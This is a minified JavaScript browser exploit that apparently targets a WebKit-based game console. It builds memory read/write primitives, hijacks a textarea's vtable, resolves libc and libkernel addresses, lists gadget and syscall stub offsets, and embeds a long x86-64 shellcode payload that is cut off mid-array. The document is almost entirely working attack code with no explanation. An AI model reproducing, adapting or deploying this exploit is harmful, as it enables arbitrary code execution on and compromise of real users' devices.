function i48_put(x,a){a[4]=x|0;a[5]=(x/4294967296)|0;}function i48_get(a){return a[4]+a[5]*4294967296;}function addrof(x){leaker_obj.a=x;return i48_get(leaker_arr);}function fakeobj(x){i48_put(x,leaker_arr);return leaker_obj.a;}function read_mem_setup(p,sz){i48_put(p,oob_master);oob_master[6]=sz;}function read_mem(p,sz){read_mem_setup(p,sz);var arr=[];for(var i=0;i<sz;i++)arr.push(oob_slave[i]);return arr;}function read_mem_s(p,sz){read_mem_setup(p,sz);return""+oob_slave;}function read_mem_b(p,sz){read_mem_setup(p,sz);var b=new Uint8Array(sz);b.set(oob_slave);return b;}function read_mem_as_string(p,sz){var x=read_mem_b(p,sz);var ans='';for(var i=0;i<x.length;i++)ans+=String.fromCharCode(x[i]);return ans;}function write_mem(p,data){i48_put(p,oob_master);oob_master[6]=data.length;for(var i=0;i<data.length;i++)oob_slave[i]=data[i];}function read_ptr_at(p){var ans=0;var d=read_mem(p,8);for(var i=7;i>=0;i--)ans=256*ans+d[i];return ans;}function write_ptr_at(p,d){var arr=[];for(var i=0;i<8;i++){arr.push(d&0xff);d/=256;}write_mem(p,arr);}function hex(x){return(new Number(x)).toString(16);}var malloc_nogc=[];function malloc(sz){var arr=new Uint8Array(sz);malloc_nogc.push(arr);return read_ptr_at(addrof(arr)+0x10);}var tarea=document.createElement('textarea');var real_vt_ptr=read_ptr_at(addrof(tarea)+0x18);var fake_vt_ptr=malloc(0x400);write_mem(fake_vt_ptr,read_mem(real_vt_ptr,0x400));write_ptr_at(addrof(tarea)+0x18,fake_vt_ptr);var real_vtable=read_ptr_at(fake_vt_ptr);var fake_vtable=malloc(0x2000);write_mem(fake_vtable,read_mem(real_vtable,0x2000));write_ptr_at(fake_vt_ptr,fake_vtable);var fake_vt_ptr_bak=malloc(0x400);write_mem(fake_vt_ptr_bak,read_mem(fake_vt_ptr,0x400));var plt_ptr=read_ptr_at(fake_vtable)-10063176;function get_got_addr(idx){var p=plt_ptr+idx*16;var q=read_mem(p,6);if(q[0]!=0xff||q[1]!=0x25)throw"invalid GOT entry";var offset=0;for(var i=5;i>=2;i--)offset=offset*256+q[i];offset+=p+6;return read_ptr_at(offset);}var webkit_base=read_ptr_at(fake_vtable);var libkernel_base=get_got_addr(705)-0x10000;var libc_base=get_got_addr(582);var saveall_addr=libc_base+0x2e2c8;var loadall_addr=libc_base+0x3275c;var setjmp_addr=libc_base+0xbfae0;var longjmp_addr=libc_base+0xbfb30;var pivot_addr=libc_base+0x327d2;var infloop_addr=libc_base+0x447a0;var jop_frame_addr=libc_base+0x715d0;var get_errno_addr_addr=libkernel_base+0x9ff0;var pthread_create_addr=libkernel_base+0xf980;function saveall(){var ans=malloc(0x800);var bak=read_ptr_at(fake_vtable+0x1d8);write_ptr_at(fake_vtable+0x1d8,saveall_addr);tarea.scrollLeft=0;write_mem(ans,read_mem(fake_vt_ptr,0x400));write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,0x400));var bak=read_ptr_at(fake_vtable+0x1d8);write_ptr_at(fake_vtable+0x1d8,saveall_addr);write_ptr_at(fake_vt_ptr+0x38,0x1234);tarea.scrollLeft=0;write_mem(ans+0x400,read_mem(fake_vt_ptr,0x400));write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,0x400));return ans;}function pivot(buf){var ans=malloc(0x400);var bak=read_ptr_at(fake_vtable+0x1d8);write_ptr_at(fake_vtable+0x1d8,saveall_addr);tarea.scrollLeft=0;write_mem(ans,read_mem(fake_vt_ptr,0x400));write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,0x400));var bak=read_ptr_at(fake_vtable+0x1d8);write_ptr_at(fake_vtable+0x1d8,pivot_addr);write_ptr_at(fake_vt_ptr+0x38,buf);write_ptr_at(ans+0x38,read_ptr_at(ans+0x38)-16);write_ptr_at(buf,ans);tarea.scrollLeft=0;write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,0x400));}var aio_init_addr=libkernel_base+126912,fpathconf_addr=libkernel_base+126944,dmem_container_addr=libkernel_base+126976,evf_clear_addr=libkernel_base+127008,kqueue_addr=libkernel_base+127040,kevent_addr=libkernel_base+127072,futimes_addr=libkernel_base+127104,open_addr=libkernel_base+127136,thr_self_addr=libkernel_base+127168,mkdir_addr=libkernel_base+127200,pipe_addr=libkernel_base+127232,stat_addr=libkernel_base+127280,write_addr=libkernel_base+127312,evf_cancel_addr=libkernel_base+127344,ktimer_delete_addr=libkernel_base+127376,setregid_addr=libkernel_base+127408,jitshm_create_addr=libkernel_base+127440,sigwait_addr=libkernel_base+127472,fdatasync_addr=libkernel_base+127504,sigtimedwait_addr=libkernel_base+127536,get_gpo_addr=libkernel_base+127568,sched_setscheduler_addr=libkernel_base+127600,osem_open_addr=libkernel_base+127632,dynlib_get_info_addr=libkernel_base+127664,osem_post_addr=libkernel_base+127712,blockpool_move_addr=libkernel_base+127744,issetugid_addr=libkernel_base+127776,getdents_addr=libkernel_base+127808,rtprio_thread_addr=libkernel_base+127840,evf_delete_addr=libkernel_base+127872,_umtx_op_addr=libkernel_base+127904,access_addr=libkernel_base+127936,reboot_addr=libkernel_base+127968,sigaltstack_addr=libkernel_base+128e3,getcontext_addr=libkernel_base+128036,munmap_addr=libkernel_base+128080,setuid_addr=libkernel_base+128112,evf_trywait_addr=libkernel_base+128144,setcontext_addr=libkernel_base+128176,dynlib_get_list_addr=libkernel_base+128208,setsid_addr=libkernel_base+128240,fstatfs_addr=libkernel_base+128272,aio_multi_wait_addr=libkernel_base+128304,accept_addr=libkernel_base+128336,set_phys_fmem_limit_addr=libkernel_base+128368,thr_get_name_addr=libkernel_base+128400,get_page_table_stats_addr=libkernel_base+128432,sigsuspend_addr=libkernel_base+128464,truncate_addr=libkernel_base+128496,fsync_addr=libkernel_base+128528,execve_addr=libkernel_base+128573,evf_open_addr=libkernel_base+128608,netabort_addr=libkernel_base+128640,blockpool_unmap_addr=libkernel_base+128672,osem_create_addr=libkernel_base+128704,getlogin_addr=libkernel_base+128736,mincore_addr=libkernel_base+128768,shutdown_addr=libkernel_base+128800,profil_addr=libkernel_base+128832,preadv_addr=libkernel_base+128864,geteuid_addr=libkernel_base+128896,set_chicken_switches_addr=libkernel_base+128928,sigqueue_addr=libkernel_base+128960,aio_multi_poll_addr=libkernel_base+128992,get_self_auth_info_addr=libkernel_base+129024,opmc_enable_addr=libkernel_base+129056,aio_multi_delete_addr=libkernel_base+129088,rfork_addr=libkernel_base+129129,sys_exit_addr=libkernel_base+129162,blockpool_batch_addr=libkernel_base+129200,sigpending_addr=libkernel_base+129232,ktimer_gettime_addr=libkernel_base+129264,opmc_set_ctr_addr=libkernel_base+129296,ksem_wait_addr=libkernel_base+129328,sched_getparam_addr=libkernel_base+129360,swapcontext_addr=libkernel_base+129392,opmc_get_ctr_addr=libkernel_base+129424,budget_get_ptype_addr=libkernel_base+129456,msync_addr=libkernel_base+129488,sigwaitinfo_addr=libkernel_base+129520,lstat_addr=libkernel_base+129552,test_debug_rwmem_addr=libkernel_base+129584,evf_create_addr=libkernel_base+129616,madvise_addr=libkernel_base+129648,cpuset_getaffinity_addr=libkernel_base+129680,evf_set_addr=libkernel_base+129712,setlogin_addr=libkernel_base+129744,ksem_init_addr=libkernel_base+129792,opmc_disable_addr=libkernel_base+129824,namedobj_delete_addr=libkernel_base+129856,gettimeofday_addr=libkernel_base+129888,read_addr=libkernel_base+129920,thr_get_ucontext_addr=libkernel_base+129952,batch_map_addr=libkernel_base+129984,sysarch_addr=libkernel_base+130016,utc_to_localtime_addr=libkernel_base+130048,evf_close_addr=libkernel_base+130080,setrlimit_addr=libkernel_base+130112,getpeername_addr=libkernel_base+130144,aio_get_data_addr=libkernel_base+130176,lseek_addr=libkernel_base+130208,connect_addr=libkernel_base+130240,recvfrom_addr=libkernel_base+130272,getrlimit_addr=libkernel_base+130304,dynlib_get_info_for_libdbg_addr=libkernel_base+130336,thr_suspend_ucontext_addr=libkernel_base+130368,_umtx_op_addr=libkernel_base+130400,kill_addr=libkernel_base+130416,dynlib_process_needed_and_relocate_addr=libkernel_base+130448,getsockname_addr=libkernel_base+130480,osem_trywait_addr=libkernel_base+130512,execve_addr=libkernel_base+130544,flock_addr=libkernel_base+130576,sigreturn_addr=libkernel_base+130608,query_memory_protection_addr=libkernel_base+130640,pwrite_addr=libkernel_base+130672,get_map_statistics_addr=libkernel_base+130704,ksem_getvalue_addr=libkernel_base+130736,sendfile_addr=libkernel_base+130768,socketex_addr=libkernel_base+130800,unlink_addr=libkernel_base+130832,thr_resume_ucontext_addr=libkernel_base+130864,dl_get_list_addr=libkernel_base+130896,cpuset_setaffinity_addr=libkernel_base+130928,clock_gettime_addr=libkernel_base+130960,thr_kill2_addr=libkernel_base+130992,set_timezone_info_addr=libkernel_base+131024,select_addr=libkernel_base+131056,pselect_addr=libkernel_base+131088,sync_addr=libkernel_base+131120,socketpair_addr=libkernel_base+131152,get_kernel_mem_statistics_addr=libkernel_base+131184,virtual_query_all_addr=libkernel_base+131216,physhm_open_addr=libkernel_base+131248,getuid_addr=libkernel_base+131280,revoke_addr=libkernel_base+131312,sigprocmask_addr=libkernel_base+131347,setegid_addr=libkernel_base+131488,cpuset_getid_addr=libkernel_base+131520,evf_wait_addr=libkernel_base+131552,sched_get_priority_max_addr=libkernel_base+131584,sigaction_addr=libkernel_base+131616,ipmimgr_call_addr=libkernel_base+131648,aio_submit_cmd_addr=libkernel_base+131680,free_stack_addr=libkernel_base+131712,settimeofday_addr=libkernel_base+131744,recvmsg_addr=libkernel_base+131776,aio_submit_addr=libkernel_base+131808,setgroups_addr=libkernel_base+131840,aio_multi_cancel_addr=libkernel_base+131872,nanosleep_addr=libkernel_base+131904,blockpool_map_addr=libkernel_base+131936,thr_create_addr=libkernel_base+131968,munlockall_addr=libkernel_base+132e3,dynlib_get_info_ex_addr=libkernel_base+132032,pwritev_addr=libkernel_base+132064,mname_addr=libkernel_base+132096,regmgr_call_addr=libkernel_base+132128,getgroups_addr=libkernel_base+132160,osem_close_addr=libkernel_base+132192,osem_delete_addr=libkernel_base+132224,dynlib_get_obj_member_addr=libkernel_base+132256,debug_init_addr=libkernel_base+132288,mmap_dmem_addr=libkernel_base+132320,kldunloadf_addr=libkernel_base+132352,mprotect_addr=libkernel_base+132384,ksem_trywait_addr=libkernel_base+132592,ksem_close_addr=libkernel_base+132624,sched_rr_get_interval_addr=libkernel_base+132656,getitimer_addr=libkernel_base+132688,getpid_addr=libkernel_base+132720,netgetsockinfo_addr=libkernel_base+132752,get_cpu_usage_all_addr=libkernel_base+132784,eport_delete_addr=libkernel_base+132816,randomized_path_addr=libkernel_base+132848,jitshm_alias_addr=libkernel_base+132880,seteuid_addr=libkernel_base+132912,set_uevt_addr=libkernel_base+132944,clock_getres_addr=libkernel_base+132976,setitimer_addr=libkernel_base+133008,thr_exit_addr=libkernel_base+133040,sandbox_path_addr=libkernel_base+133072,thr_kill_addr=libkernel_base+133104,sys_exit_addr=libkernel_base+133136,dup2_addr=libkernel_base+133168,utimes_addr=libkernel_base+133200,pread_addr=libkernel_base+133232,dl_get_info_addr=libkernel_base+133264,ktimer_settime_addr=libkernel_base+133296,sched_setparam_addr=libkernel_base+133328,aio_create_addr=libkernel_base+133360,osem_wait_addr=libkernel_base+133392,dynlib_get_list_for_libdbg_addr=libkernel_base+133424,get_proc_type_info_addr=libkernel_base+133456,getgid_addr=libkernel_base+133488,fstat_addr=libkernel_base+133520,fork_addr=libkernel_base+133552,namedobj_create_addr=libkernel_base+133584,opmc_set_ctl_addr=libkernel_base+133616,get_resident_count_addr=libkernel_base+133648,getdirentries_addr=libkernel_base+133680,getrusage_addr=libkernel_base+133712,setreuid_addr=libkernel_base+133744,wait4_addr=libkernel_base+133776,__sysctl_addr=libkernel_base+133808,bind_addr=libkernel_base+133840,sched_yield_addr=libkernel_base+133872,dl_get_metadata_addr=libkernel_base+133904,get_resident_fmem_count_addr=libkernel_base+133936,setsockopt_addr=libkernel_base+133968,dynlib_load_prx_addr=libkernel_base+134e3,getpriority_addr=libkernel_base+134032,get_phys_page_size_addr=libkernel_base+134064,opmc_set_hw_addr=libkernel_base+134096,dynlib_do_copy_relocations_addr=libkernel_base+134128,netcontrol_addr=libkernel_base+134160,ksem_post_addr=libkernel_base+134192,netgetiflist_addr=libkernel_base+134224,chmod_addr=libkernel_base+134256,aio_suspend_addr=libkernel_base+134288,ksem_timedwait_addr=libkernel_base+134320,dynlib_dlsym_addr=libkernel_base+134352,get_paging_stats_of_all_objects_addr=libkernel_base+134384,osem_cancel_addr=libkernel_base+134416,writev_addr=libkernel_base+134448,ktimer_getoverrun_addr=libkernel_base+134480,rmdir_addr=libkernel_base+134512,sched_get_priority_min_addr=libkernel_base+134544,dynlib_unload_prx_addr=libkernel_base+134576,thr_set_name_addr=libkernel_base+134608,mlockall_addr=libkernel_base+134640,openat_addr=libkernel_base+134672,eport_open_addr=libkernel_base+134704,sigprocmask_addr=libkernel_base+134736,chdir_addr=libkernel_base+134768,physhm_unlink_addr=libkernel_base+134800,mtypeprotect_addr=libkernel_base+134832,thr_wake_addr=libkernel_base+134864,blockpool_open_addr=libkernel_base+134896,thr_new_addr=libkernel_base+134928,munlock_addr=libkernel_base+134960,fchflags_addr=libkernel_base+134992,ftruncate_addr=libkernel_base+135024,rename_addr=libkernel_base+135056,poll_addr=libkernel_base+135088,eport_trigger_addr=libkernel_base+135120,getsid_addr=libkernel_base+135152,virtual_query_addr=libkernel_base+135184,fchmod_addr=libkernel_base+135216,_umtx_unlock_addr=libkernel_base+135248,mmap_addr=libkernel_base+135280,ktimer_create_addr=libkernel_base+135312,dup_addr=libkernel_base+135344,sendmsg_addr=libkernel_base+135376,close_addr=libkernel_base+135408,is_development_mode_addr=libkernel_base+135440,getegid_addr=libkernel_base+135472,get_vm_map_timestamp_addr=libkernel_base+135504,dynlib_get_proc_param_addr=libkernel_base+135536,fcntl_addr=libkernel_base+135568,getppid_addr=libkernel_base+135600,readv_addr=libkernel_base+135632,rdup_addr=libkernel_base+135664,listen_addr=libkernel_base+135696,app_state_change_addr=libkernel_base+135728,set_gpo_addr=libkernel_base+135760,ksem_unlink_addr=libkernel_base+135792,get_cpu_usage_proc_addr=libkernel_base+135824,shm_unlink_addr=libkernel_base+135856,reserve_2mb_page_addr=libkernel_base+135888,dynlib_get_info2_addr=libkernel_base+135920,mlock_addr=libkernel_base+135952,workaround8849_addr=libkernel_base+135984,get_sdk_compiled_version_addr=libkernel_base+136016,clock_settime_addr=libkernel_base+136048,ksem_destroy_addr=libkernel_base+136080,ksem_open_addr=libkernel_base+136112,thr_set_ucontext_addr=libkernel_base+136144,get_bio_usage_all_addr=libkernel_base+136176,getdtablesize_addr=libkernel_base+136208,chflags_addr=libkernel_base+136240,shm_open_addr=libkernel_base+136272,eport_close_addr=libkernel_base+136304,dynlib_get_list2_addr=libkernel_base+136336,socketclose_addr=libkernel_base+136368,sched_getscheduler_addr=libkernel_base+136400,pathconf_addr=libkernel_base+136432,localtime_to_utc_addr=libkernel_base+136464,setpriority_addr=libkernel_base+136496,cpumode_yield_addr=libkernel_base+136528,process_terminate_addr=libkernel_base+136560,ioctl_addr=libkernel_base+136592,opmc_get_hw_addr=libkernel_base+136624,eport_create_addr=libkernel_base+136656,socket_addr=libkernel_base+136688,_umtx_lock_addr=libkernel_base+136720,thr_suspend_addr=libkernel_base+136752,is_in_sandbox_addr=libkernel_base+136784,get_authinfo_addr=libkernel_base+136816,mdbg_service_addr=libkernel_base+136848,getsockopt_addr=libkernel_base+136880,get_paging_stats_of_all_threads_addr=libkernel_base+136912,adjtime_addr=libkernel_base+136944,kqueueex_addr=libkernel_base+136976,uuidgen_addr=libkernel_base+137008,set_vm_container_addr=libkernel_base+137040,sendto_addr=libkernel_base+137072;
var payload = [233,45,1,0,0,243,15,30,250,65,84,83,81,72,139,29,76,26,0,0,72,139,53,61,26,0,0,186,220,63,0,0,72,139,61,65,26,0,0,72,141,131,176,22,60,0,255,208,65,137,196,255,192,117,46,72,139,53,42,26,0,0,72,141,147,128,50,18,0,72,141,61,243,16,0,0,49,192,72,129,195,240,20,60,0,255,210,72,139,61,250,25,0,0,190,220,63,0,0,255,211,90,68,137,224,91,65,92,195,243,15,30,250,85,83,80,72,139,71,8,185,130,0,0,192,72,139,112,64,76,139,64,72,15,50,72,137,209,72,186,19,0,0,0,0,0,1,56,72,193,225,32,199,70,20,0,0,0,0,72,9,200,72,141,168,64,254,255,255,72,141,152,192,48,18,0,72,139,134,24,1,0,0,72,137,45,162,25,0,0,72,199,70,4,0,0,0,0,199,0,0,0,0,0,72,139,133,24,229,19,1,72,137,70,48,72,139,133,32,3,48,2,73,137,64,32,73,137,64,24,72,139,135,48,1,0,0,72,141,61,95,16,0,0,72,137,80,88,72,199,64,96,255,255,255,255,72,199,64,104,255,255,255,255,49,192,255,211,72,137,238,72,141,61,96,16,0,0,49,192,255,211,72,139,53,55,25,0,0,72,141,61,104,16,0,0,49,192,255,211,90,49,192,91,93,195,243,15,30,250,65,86,65,85,65,84,85,72,129,236,8,1,0,0,232,11,12,0,0,232,110,3,0,0,232,151,8,0,0,232,177,10,0,0,69,49,201,65,131,200,255,49,255,185,2,16,0,0,186,3,0,0,0,190,220,63,0,0,232,231,2,0,0,69,49,201,65,131,200,255,185,2,16,0,0,186,3,0,0,0,49,255,190,0,64,124,6,73,137,198,72,137,229,232,196,2,0,0,72,141,53,206,254,255,255,191,11,0,0,0,73,137,196,49,192,76,137,53,168,24,0,0,232,92,15,0,0,232,249,1,0,0,72,141,21,227,15,0,0,190,0,1,0,0,72,137,239,49,192,255,21,247,24,0,0,72,137,239,232,72,2,0,0,72,139,5,128,24,0,0,72,141,53,30,254,255,255,191,11,0,0,0,76,137,37,101,24,0,0,72,5,208,204,109,2,72,137,5,104,24,0,0,49,192,232,10,15,0,0,72,141,21,165,15,0,0,190,0,1,0,0,72,137,239,49,192,255,21,170,24,0,0,72,137,239,232,251,1,0,0,186,255,1,0,0,190,1,6,0,0,72,141,61,145,15,0,0,232,135,0,0,0,72,141,21,188,15,0,0,133,192,126,33,186,32,0,0,0,65,137,197,76,137,230,137,199,232,94,0,0,0,68,137,239,232,110,0,0,0,72,141,21,118,15,0,0,190,0,1,0,0,72,137,239,49,192,255,21,80,24,0,0,72,137,239,232,161,1,0,0,76,137,247,190,220,63,0,0,232,219,1,0,0,76,137,231,190,0,64,124,6,232,206,1,0,0,72,129,196,8,1,0,0,49,192,93,65,92,65,93,65,94,195,72,199,192,3,0,0,0,233,93,14,0,0,72,199,192,4,0,0,0,233,81,14,0,0,72,199,192,5,0,0,0,233,69,14,0,0,72,199,192,6,0,0,0,233,57,14,0,0,72,199,192,10,0,0,0,233,45,14,0,0,72,199,192,9,0,0,0,233,33,14,0,0,72,199,192,58,0,0,0,233,21,14,0,0,72,199,192,57,0,0,0,233,9,14,0,0,72,199,192,21,0,0,0,233,253,13,0,0,72,199,192,122,1,0,0,233,241,13,0,0,72,199,192,22,0,0,0,233,229,13,0,0,72,199,192,123,0,0,0,233,217,13,0,0,72,199,192,124,0,0,0,233,205,13,0,0,72,199,192,128,0,0,0,233,193,13,0,0,72,199,192,136,0,0,0,233,181,13,0,0,72,199,192,137,0,0,0,233,169,13,0,0,72,199,192,188,0,0,0,233,157,13,0,0,72,199,192,189,0,0,0,233,145,13,0,0,72,199,192,190,0,0,0,233,133,13,0,0,72,199,192,16,1,0,0,233,121,13,0,0,72,199,192,222,1,0,0,233,109,13,0,0,72,199,192,237,1,0,0,233,97,13,0,0,243,15,30,250,65,84,69,49,201,85,69,49,192,49,201,49,210,49,246,72,141,61,65,14,0,0,80,255,21,132,26,0,0,49,201,69,49,201,65,137,196,69,49,192,49,210,49,246,72,141,61,74,14,0,0,255,21,104,26,0,0,68,137,231,72,141,21,126,22,0,0,137,197,72,141,53,93,14,0,0,232,172,5,0,0,89,137,239,93,72,141,21,117,22,0,0,65,92,72,141,53,109,14,0,0,233,147,5,0,0,243,15,30,250,85,72,137,250,72,129,236,0,2,0,0,72,141,53,115,14,0,0,72,137,229,49,192,72,137,239,255,21,227,23,0,0,72,137,238,191,222,0,0,0,255,21,37,22,0,0,72,129,196,0,2,0,0,93,195,72,199,192,221,1,0,0,233,172,12,0,0,72,199,192,73,0,0,0,233,160,12,0,0,72,199,192,74,0,0,0,233,148,12,0,0,72,199,192,65,0,0,0,233,136,12,0,0,72,199,192,203,0,0,0,233,124,12,0,0,72,199,192,204,0,0,0,233,112,12,0,0,72,199,192,35,2,0,0,233,100,12,0,0,72,199,192,60,2,0,0,233,88,12,0,0,243,15,30,250,85,69,49,201,69,49,192,49,201,49,210,49,246,72,141,61,217,13,0,0,255,21,126,25,0,0,72,141,21,7,22,0,0,72,141,53,221,13,0,0,137,197,137,199,232,195,4,0,0,137,239,72,141,21,134,23,0,0,72,141,53,203,13,0,0,232,174,4,0,0,137,239,72,141,21,1,22,0,0,72,141,53,187,13,0,0,232,153,4,0,0,137,239,72,141,21,92,22,0,0,72,141,53,173,13,0,0,232,132,4,0,0,137,239,72,141,21,231,22,0,0,72,141,53,160,13,0,0,232,111,4,0,0,137,239,72,141,21,146,22,0,0,72,141,53,148,13,0,0,232,90,4,0,0,137,239,72,141,21,109,21,0,0,72,141,53,134,13,0,0,232,69,4,0,0,137,239,72,141,21,24,22,0,0,72,141,53,120,13,0,0,232,48,4,0,0,137,239,72,141,21,35,21,0,0,72,141,53,106,13,0,0,232,27,4,0,0,137,239,72,141,21,214,21,0,0,72,141,53,92,13,0,0,232,6,4,0,0,137,239,72,141,21,129,21,0,0,72,141,53,79,13,0,0,232,241,3,0,0,137,239,72,141,21,212,21,0,0,72,141,53,65,13,0,0,232,220,3,0,0,137,239,72,141,21,127,22,0,0,72,141,53,52,13,0,0,232,199,3,0,0,137,239,72,141,21,26,22,0,0,72,141,53,38,13,0,0,232,178,3,0,0,137,239,72,141,21,101,21,0,0,72,141,53,24,13,0,0,232,157,3,0,0,137,239,72,141,21,8,22,0,0,72,141,53,11,13,0,0,232,136,3,0,0,137,239,72,141,21,147,20,0,0,72,141,53,254,12,0,0,232,115,3,0,0,137,239,72,141,21,78,21,0,0,72,141,53,242,12,0,0,232,94,3,0,0,137,239,72,141,21,9,22,0,0,72,141,53,228,12,0,0,232,73,3,0,0,137,239,72,141,21,148,20,0,0,72,141,53,214,12,0,0,232,52,3,0,0,137,239,72,141,21,199,20,0,0,72,141,53,201,12,0,0,232,31,3,0,0,137,239,72,141,21,26,21,0,0,72,141,53,187,12,0,0,232,10,3,0,0,137,239,72,141,21,13,21,0,0,72,141,53,174,12,0,0,232,245,2,0,0,137,239,72,141,21,80,20,0,0,72,141,53,152,12,0,0,232,224,2,0,0,137,239,72,141,21,99,21,0,0,72,141,53,138,12,0,0,232,203,2,0,0,137,239,72,141,21,94,21,0,0,72,141,53,125,12,0,0,232,182,2,0,0,137,239,72,141,21,97,20,0,0,72,141,53,109,12,0,0,232,161,2,0,0,137,239,72,141,21,164,19,0,0,72,141,53,96,12,0,0,232,140,2,0,0,137,239,72,141,21,239,19,0,0,72,141,53,84,12,0,0,232,119,2,0,0,137,239,72,141,21,106,20,0,0,72,141,53,74,12,0,0,232,98,2,0,0,137,239,72,141,21,45,20,0,0,72,141,53,60,12,0,0,232,77,2,0,0,137,239,72,141,21,128,20,0,0,72,141,53,45,12,0,0,232,56,2,0,0,137,239,72,141,21,211,19,0,0,72,141,53,25,12,0,0,232,35,2,0,0,137,239,72,141,21,30,19,0,0,72,141,53,9,12,0,0,232,14,2,0,0,137,239,72,141,21,33,20,0,0,72,141,53,252,11,0,0,232,249,1,0,0,137,239,72,141,21,108,19,0,0,72,141,53,225,11,0,0,232,228,1,0,0,137,239,72,141,21,87,20,0,0,72,141,53,212,11,0,0,232,207,1,0,0,137,239,72,141,21,18,20,0,0,72,141,53,184,11,0,0,232,186,1,0,0,137,239,72,141,21,85,20,0,0,72,141,53,178,11,0,0,232,165,1,0,0,137,239,72,141,21,0,20,0,0,72,141,53,164,11,0,0,232,144,1,0,0,137,239,72,141,21,171,19,0,0,72,141,53,152,11,0,0,232,123,1,0,0,137,239,72,141,21,246,19,0,0,72,141,53,141,11,0,0,232,102,1,0,0,137,239,72,141,21,241,18,0,0,72,141,53,132,11,0,0,232,81,1,0,0,137,239,72,141,21,156,19,0,0,72,141,53,118,11,0,0,232,60,1,0,0,137,239,72,141,21,127,18,0,0,72,141,53,105,11,0,0,232,39,1,0,0,137,239,72,141,21,90,18,0,0,72,141,53,92,11,0,0,232,18,1,0,0,137,239,72,141,21,205,19,0,0,72,141,53,81,11,0,0,232,253,0,0,0,137,239,72,141,21,24,18,0,0,72,141,53,68,11,0,0,232,232,0,0,0,137,239,72,141,21,11,18,0,0,72,141,53,55,11,0,0,232,211,0,0,0,137,239,72,141,21,134,19,0,0,72,141,53,44,11,0,0,232,190,0,0,0,137,239,72,141,21,97,18,0,0,72,141,53,32,11,0,0,232,169,0,0,0,137,239,72,141,21,228,17,0,0,72,141,53,17,11,0,0,232,148,0,0,0,137,239,72,141,21,159,18,0,0,72,141,53,8,11,0,0,232,127,0,0,0,137,239,72,141,21,106,18,0,0,72,141,53,249,10,0,0,232,106,0,0,0,137,239,72,141,21,245,18,0,0,72,141,53,234,10,0,0,232,85,0,0,0,137,239,72,141,21,216,17,0,0,72,141,53,220,10,0,0,232,64,0,0,0,137,239,72,141,21,107,18,0,0,72,141,53,205,10,0,0,232,43,0,0,0,137,239,72,141,21,102,18,0,0,72,141,53,190,10,0,0,232,22,0,0,0,137,239,93,72,141,21,128,17,0,0,72,141,53,175,10,0,0,233,0,0,0,0,72,199,192,79,2,0,0,233,84,7,0,0,72,199,192,80,2,0,0,233,72,7,0,0,243,15,30,250,72,137,241,49,210,72,137,254,69,49,192,80,191,82,2,0,0,49,192,232,41,7,0,0,90,195,243,15,30,250,85,69,49,201,69,49,192,49,201,49,210,49,246,72,141,61,100,10,0,0,255,21,80,20,0,0,72,141,21,161,18,0,0,72,141,53,95,10,0,0,137,197,137,199,232,149,255,255,255,137,239,72,141,21,192,18,0,0,72,141,53,83,10,0,0,232,128,255,255,255,137,239,72,141,21,195,18,0,0,72,141,53,80,10,0,0,232,107,255,255,255,137,239,72,141,21,126,18,0,0,72,141,53,73,10,0,0,232,86,255,255,255,137,239,72,141,21,145,18,0,0,72,141,53,63,10,0,0,232,65,255,255,255,137,239,72,141,21,156,18,0,0,72,141,53,53,10,0,0,232,44,255,255,255,137,239,72,141,21,159,18,0,0,72,141,53,45,10,0,0,232,23,255,255,255,137,239,72,141,21,74,18,0,0,72,141,53,37,10,0,0,232,2,255,255,255,137,239,72,141,21,125,18,0,0,72,141,53,27,10,0,0,232,237,254,255,255,137,239,72,141,21,240,17,0,0,72,141,53,24,10,0,0,232,216,254,255,255,137,239,72,141,21,67,18,0,0,72,141,53,21,10,0,0,232,195,254,255,255,137,239,72,141,21,230,17,0,0,72,141,53,17,10,0,0,232,174,254,255,255,137,239,72,141,21,153,17,0,0,72,141,53,13,10,0,0,232,153,254,255,255,137,239,72,141,21,148,17,0,0,72,141,53,7,10,0,0,232,132,254,255,255,137,239,72,141,21,87,17,0,0,72,141,53,1,10,0,0,232,111,254,255,255,137,239,72,141,21,138,17,0,0,72,141,53,249,9,0,0,232,90,254,255,255,137,239,72,141,21,101,17,0,0,72,141,53,240,9,0,0,232,69,254,255,255,137,239,72,141,21,32,17,0,0,72,141,53,231,9,0,0,232,48,254,255,255,137,239,72,141,21,147,17,0,0,72,141,53,223,9,0,0,232,27,254,255,255,137,239,72,141,21,102,17,0,0,72,141,53,214,9,0,0,232,6,254,255,255,69,49,201,69,49,192,49,201,49,210,49,246,72,141,61,202,9,0,0,255,21,145,18,0,0,72,141,21,186,16,0,0,72,141,53,200,9,0,0,137,197,137,199,232,214,253,255,255,137,239,72,141,21,41,17,0,0,72,141,53,189,9,0,0,232,193,253,255,255,137,239,93,72,141,21,163,16,0,0,72,141,53,181,9,0,0,233,171,253,255,255,243,15,30,250,80,139,61,164,17,0,0,72,141,21,125,17,0,0,72,141,53,168,9,0,0,232,141,253,255,255,139,61,139,17,0,0,72,141,21,52,17,0,0,72,141,53,160,9,0,0,232,116,253,255,255,139,61,114,17,0,0,72,141,21,11,17,0,0,72,141,53,150,9,0,0,232,91,253,255,255,139,61,89,17,0,0,72,141,21,42,17,0,0,72,141,53,142,9,0,0,232,66,253,255,255,139,61,64,17,0,0,72,141,21,241,16,0,0,72,141,53,132,9,0,0,232,41,253,255,255,139,61,39,17,0,0,72,141,21,200,16,0,0,72,141,53,123,9,0,0,232,16,253,255,255,139,61,14,17,0,0,72,141,21,151,16,0,0,72,141,53,113,9,0,0,232,247,252,255,255,139,61,245,16,0,0,72,141,21,174,16,0,0,72,141,53,105,9,0,0,232,222,252,255,255,139,61,220,16,0,0,72,141,21,93,16,0,0,72,141,53,100,9,0,0,232,197,252,255,255,139,61,195,16,0,0,72,141,21,164,16,0,0,72,141,53,98,9,0,0,232,172,252,255,255,139,61,170,16,0,0,72,141,21,59,16,0,0,72,141,53,93,9,0,0,232,147,252,255,255,139,61,145,16,0,0,72,141,21,90,16,0,0,72,141,53,91,9,0,0,232,122,252,255,255,139,61,120,16,0,0,72,141,21,57,16,0,0,89,72,141,53,90,9,0,0,233,96,252,255,255,243,15,30,250,72,141,53,89,16,0,0,72,141,61,89,9,0,0,82,72,199,5,198,16,0,0,0,0,0,0,232,85,252,255,255,133,192,116,42,72,141,53,54,16,0,0,72,141,61,69,9,0,0,232,62,252,255,255,133,192,116,19,72,141,53,31,16,0,0,72,141,61,65,9,0,0,232,39,252,255,255,139,61,13,16,0,0,72,141,21,14,16,0,0,72,